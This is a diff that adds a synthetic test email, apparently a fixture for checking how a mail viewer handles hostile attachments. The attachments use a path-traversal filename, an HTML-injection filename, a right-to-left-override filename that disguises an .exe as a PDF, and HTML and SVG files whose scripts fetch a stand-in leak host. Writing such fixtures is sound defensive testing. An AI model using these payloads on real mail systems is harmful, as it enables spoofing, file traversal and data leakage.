@@ -1,0 +1,37 @@
+From: Mallory <mallory@attacker.example>
+To: admin@example.test
+Subject: Hostile attachments
+Date: Mon, 09 Nov 2026 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="hostile-attachments"
+
+--hostile-attachments
+Content-Type: text/html; charset=utf-8
+
+<p>Five attachments with hostile names and content.</p>
+--hostile-attachments
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: attachment; filename="../../etc/passwd"
+
+root:x:0:0:root:/root:/bin/sh
+--hostile-attachments
+Content-Type: text/html; charset=utf-8
+Content-Disposition: attachment; filename="<b>x</b>.html"
+
+<b>Bold name</b>
+--hostile-attachments
+Content-Type: application/pdf
+Content-Disposition: attachment; filename*=utf-8''Rechnung%E2%80%AEfdp.exe
+
+%PDF-1.4 synthetic
+--hostile-attachments
+Content-Type: text/html; charset=utf-8
+Content-Disposition: attachment; filename="report.html"
+
+<html><head><title>MARKER-TITLE-attachment</title></head><body><script>document.title = "MARKER-TITLE-attachment-script"; fetch("https://leak.example.test/attachment");</script><p>MARKER-ATTACHMENT-HTML</p></body></html>
+--hostile-attachments
+Content-Type: image/svg+xml
+Content-Disposition: attachment; filename="drawing.svg"
+
+<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>document.title = "MARKER-TITLE-svg-attachment"; fetch("https://leak.example.test/svg");</script><text y="10">MARKER-ATTACHMENT-SVG</text></svg>
+--hostile-attachments--
